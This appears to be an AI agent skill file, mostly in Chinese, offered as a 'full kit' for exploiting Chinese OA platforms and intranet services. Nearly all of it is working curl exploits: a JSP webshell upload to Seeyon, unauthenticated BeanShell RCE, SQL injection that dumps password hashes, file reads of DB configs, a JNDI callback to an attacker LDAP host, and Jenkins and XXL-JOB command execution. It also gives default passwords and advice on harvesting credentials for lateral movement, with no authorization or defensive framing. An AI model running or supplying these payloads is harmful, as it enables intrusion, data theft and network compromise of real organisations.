---
name: oa-system-attack
description: 国产 OA 与内网系统漏洞利用全家桶。Use when the target is a Chinese OA (致远 Seeyon / 泛微 Weaver-Ecology / 用友 Yonyou-NC / 通达 Tongda / 蓝凌 Landray / 万户 Ezoffice / 金蝶 Kingdee / 红帆 iOffice) or common internal services (Zabbix / Jenkins / Nacos / XXL-JOB / MinIO). These are high-frequency in intranet/APT stages — they have many historical CVEs, low patch rates, and usually run with high privilege. The OA is often the stage-2 wall in a multi-stage engagement: don't fight its login form, hit the known unauthenticated RCE/upload/SQLi endpoints directly.
---

# 国产 OA / 内网系统漏洞利用

## 1. 先指纹识别(看路径/关键字)

```bash
curl -s http://TARGET | grep -iE "seeyon|致远|weaver|ecology|泛微|yonyou|用友|tongda|通达|landray|蓝凌|ezoffice|万户|kingdee|金蝶|ioffice|红帆"
curl -sI http://TARGET/seeyon/     # 致远
curl -s  http://TARGET/weaver/    # 泛微 E-cology
curl -s  http://TARGET/ispirit/   # 通达
curl -s  http://TARGET/sys/       # 蓝凌
curl -s  http://TARGET/portal/    # 用友 NC
```

## 2. 各 OA 的一发入魂端点(未授权优先)

### 致远 Seeyon
```bash
# 管理员 session 泄露 → 直接登录后台
curl "http://TARGET/seeyon/thirdpartyController.do" -d "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMQ%3D%3D"
# htmlofficeservlet 上传 JSP webshell(RCE)
curl "http://TARGET/seeyon/htmlofficeservlet" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary 'DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLesQYOGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
# 任意文件下载
curl "http://TARGET/seeyon/downloadExcelBean498.do?method=addRow&field_name=&key=&file_name=../../../etc/passwd"
```

### 泛微 Weaver / E-cology
```bash
# BeanShell 未授权 RCE(最经典)
curl "http://TARGET/weaver/bsh.servlet.BshServlet" -d 'bsh.script=exec("id");'
curl "http://TARGET/weaver/bsh.servlet.BshServlet" -d 'bsh.script=new String(Runtime.getRuntime().exec("id").getInputStream().readAllBytes());'
# SQLi → 读用户表(HrmResourceManager 的 loginid/passwd)
curl "http://TARGET/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333" \
  -d "formids=1)))UNION SELECT 1,2,loginid,passwd,5,6,7 FROM HrmResourceManager--"
# 数据库配置泄露(直接拿 DB 密码)
curl "http://TARGET/mobile/DBconfigReader.jsp"
# SSRF → 打内网(OA 在别的 host 时用这个)
curl "http://TARGET/weaver/ln.FileDownload?fpath=http://INTERNAL_IP:PORT/"
```

### 用友 NC / U8
```bash
# BeanShell 未授权 RCE
curl "http://TARGET/servlet/~ic/bsh.servlet.BshServlet" -d 'bsh.script=exec("id");'
# 任意文件上传 → webshell
curl "http://TARGET/servlet/FileReceiveServlet" -F "FileName=/../../webapps/nc_web/shell.jsp" -F "file=@shell.jsp"
# 目录遍历 / 文件读取
curl "http://TARGET/NCFindWeb?service=IPreAlertConfigService&filename=../../../../../../etc/passwd"
```

### 通达 Tongda
```bash
# 任意用户登录(UID=1 = admin)
curl "http://TARGET/logincheck_code.php" -d "CODEUID=&UID=1"
# 上传 + 文件包含 RCE:先传 shell.jpg 到 attach,再 gateway.php 包含
curl "http://TARGET/ispirit/im/upload.php" -F "UPLOAD_MODE=2" -F "P=123" -F "DEST_UID=1" -F "ATTACHMENT=@shell.jpg"
curl "http://TARGET/ispirit/interface/gateway.php" -d 'json={"url":"/general/../../attach/im/PATH/shell.jpg"}'
# 任意文件下载(读 oa_config.php 拿 DB 密码)
curl "http://TARGET/inc/package/down.php?P=../../../webroot/inc/oa_config.php"
```

### 蓝凌 Landray
```bash
# custom.jsp SSRF → 文件读取 / JNDI RCE
curl "http://TARGET/sys/ui/extend/varkind/custom.jsp" -d 'var={"body":{"file":"file:///etc/passwd"}}'
curl "http://TARGET/sys/ui/extend/varkind/custom.jsp" -d 'var={"body":{"file":"ldap://ATTACKER:1389/Exploit"}}'
```

### 万户 Ezoffice / 金蝶 Kingdee / 红帆 iOffice
```bash
# 万户: 任意文件上传
curl "http://TARGET/defaultroot/upload/fileUpload.controller" -F "path=../webapps/defaultroot/" -F "file=@shell.jsp"
# 金蝶 EAS: ilogsearch.jsp 反序列化 / 云星空 DevReportService 上传
# 红帆 iOffice: uploadOperation.aspx 任意上传
```

## 3. 默认口令(先试一遍)

seeyon/123456, admin/123456, admin/1, admin/888888, tongda/123456, UID=1 免密, zabbix Admin/zabbix, nacos/nacos, xxl-job admin/123456, jenkins 无认证 script console。

## 4. 内网常见系统(OA 打不动时,横向到这些)

```bash
# Zabbix 默认 Admin/zabbix → api_jsonrpc.php 拿主机/执行脚本
# Jenkins 未授权 script console RCE
curl "http://TARGET:8080/script" -d 'script=println "id".execute().text'
# Nacos 默认 nacos/nacos → 读配置(常含 DB/云 AK 密码)
curl "http://TARGET:8848/nacos/v1/cs/configs?dataId=&group=&pageNo=1&pageSize=100&search=accurate"
# XXL-JOB admin/123456 → GLUE_SHELL RCE
curl "http://TARGET:9999/run" -d '{"jobId":1,"executorHandler":"demoJobHandler","glueType":"GLUE_SHELL","glueSource":"id"}'
# MinIO CVE-2023-28432 信息泄露
curl "http://TARGET:9000/minio/health/cluster?verify"
```

## 5. DB 是 cheat-code(跳过登录/验证码的关键)

拿到 DB 配置(DBconfigReader.jsp / oa_config.php / Nacos 配置 / backup 文件)后,**别跟 OA 登录表单和验证码硬刚**——直接连库查用户表拿账号哈希(泛微 `HrmResourceManager`, 通达 `USER`, 致远 `V3XUSER`),或直接读库里的明文敏感数据(系统配置、密钥、内网主机)。

## 6. 纪律

- 先指纹再打:每家 OA 的端点不通用,打错端点只会浪费时间。
- 优先未授权 RCE(BshServlet/上传/反序列化)> 默认口令 > SQLi 读用户表 > 验证码绕过。
- 拿 shell 后立即找 DB 配置和 `.bash_history`,为下一跳(内网横向)准备凭据。
- 每个端点先 curl 探测(200/指纹),确认产品后再上完整 payload。
